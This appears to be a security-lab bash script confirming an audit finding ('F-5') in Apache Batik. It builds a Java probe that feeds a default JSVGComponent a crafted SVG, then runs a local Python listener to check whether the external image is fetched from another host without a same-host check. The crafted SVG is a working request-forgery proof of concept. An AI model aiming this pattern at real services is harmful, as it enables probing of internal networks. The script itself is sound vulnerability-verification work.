#!/usr/bin/env bash
# Live-test F-5: default `new JSVGComponent()` (svgUserAgent=null) => RelaxedExternalResourceSecurity
# => loads external <image href> from ANY host with no same-host check. Headless.
set -uo pipefail
W=/tmp/batik-lab; cd "$W"
CP=$(printf '%s' "$W/batik-1.19/lib/*")

cat > CanvasProbe.java <<'JAVA'
import org.apache.batik.swing.svg.JSVGComponent;
import org.apache.batik.dom.svg.SAXSVGDocumentFactory;
import org.apache.batik.util.XMLResourceDescriptor;
import org.apache.batik.swing.gvt.GVTTreeRendererAdapter;
import org.apache.batik.swing.gvt.GVTTreeRendererEvent;
import org.w3c.dom.svg.SVGDocument;
import java.io.*;
public class CanvasProbe {
  public static void main(String[] a) throws Exception {
    System.setProperty("java.awt.headless","true");
    String parser = XMLResourceDescriptor.getXMLParserClassName();
    SAXSVGDocumentFactory df = new SAXSVGDocumentFactory(parser);
    String svg = "<svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='20' height='20'>"
               + "<image x='0' y='0' width='20' height='20' xlink:href='http://127.0.0.1:9999/canvas-probe'/></svg>";
    // document URI = an attacker/other host; a same-host policy would BLOCK 127.0.0.1:9999
    SVGDocument doc = df.createSVGDocument("http://198.51.100.9/doc.svg", new StringReader(svg));
    JSVGComponent comp = new JSVGComponent();   // svgUserAgent == null  => Relaxed
    final Object lock = new Object();
    comp.addGVTTreeRendererListener(new GVTTreeRendererAdapter(){
      public void gvtRenderingCompleted(GVTTreeRendererEvent e){ synchronized(lock){ lock.notifyAll(); } }
    });
    comp.setSize(20,20);
    comp.setSVGDocument(doc);
    System.out.println("doc set; waiting for async load+GVT build (resource fetch)...");
    Thread.sleep(9000);
    System.out.println("DONE_WAIT");
  }
}
JAVA
javac -cp "$CP" CanvasProbe.java 2>&1 | head -8
[ -f CanvasProbe.class ] || { echo COMPILE_FAIL; exit 1; }

cat > srv_canvas.py <<'PY'
import http.server, socketserver, threading, time
HIT={"n":0}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        HIT["n"]+=1; print("CANVAS_HIT",self.path,flush=True)
        self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
def s():
    with socketserver.TCPServer(("127.0.0.1",9999),H) as srv: srv.serve_forever()
threading.Thread(target=s,daemon=True).start()
for _ in range(30):
    time.sleep(0.5)
    if HIT["n"]:
        print("RESULT: F5_CONFIRMED — default JSVGComponent (Relaxed) fetched cross-host resource (no same-host check)",flush=True); break
else:
    print("RESULT: NO_HIT",flush=True)
PY
python3 srv_canvas.py > /tmp/batik-lab/f5.result 2>&1 &
SRV=$!; sleep 1.2
timeout 40 java -cp "$CP:." CanvasProbe 2>&1 | grep -iE "doc set|DONE_WAIT|exception|error|headless" | head -6
sleep 3
echo "=== F-5 result ==="; cat /tmp/batik-lab/f5.result 2>/dev/null | tail -4
kill $SRV 2>/dev/null; echo END
